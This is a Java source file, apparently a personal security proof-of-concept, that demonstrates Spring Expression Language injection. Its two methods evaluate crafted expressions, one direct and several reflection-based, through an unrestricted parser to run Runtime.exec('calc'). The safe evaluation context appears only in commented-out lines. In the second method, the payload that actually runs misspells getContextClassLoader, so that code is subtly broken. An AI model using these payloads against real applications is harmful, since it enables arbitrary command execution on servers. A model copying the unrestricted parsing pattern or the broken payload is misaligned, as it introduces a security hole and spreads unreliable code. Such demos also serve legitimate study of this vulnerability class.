package com.example.poc.securityPoc.demo;

import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;

public class SPELDemo {
    public static void main(String[] args) {
//        demo1();
        demo2();
    }

    /**
     * SPEL 表达式注入
     */
    public static void demo1() {
        String poc = "T(java.lang.Runtime).getRuntime().exec('calc')";
        SpelExpressionParser parser = new SpelExpressionParser();

        Expression expression = parser.parseExpression(poc);
        expression.getValue();

//        SimpleEvaluationContext build = SimpleEvaluationContext.forReadOnlyDataBinding().build();
//        expression.getValue(build);
    }

    /**
     * 利用反射实现 SPEL 表达式注入
     */
    public static void demo2(){
        String poc="''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')";
        poc="(new java.lang.Thread()).currentThread().getContextClassLoad().loadClass('java.lang.Runtime').getRuntime().exec('calc')";
        SpelExpressionParser parser = new SpelExpressionParser();

        Expression expression = parser.parseExpression(poc);

        expression.getValue();
    }
}
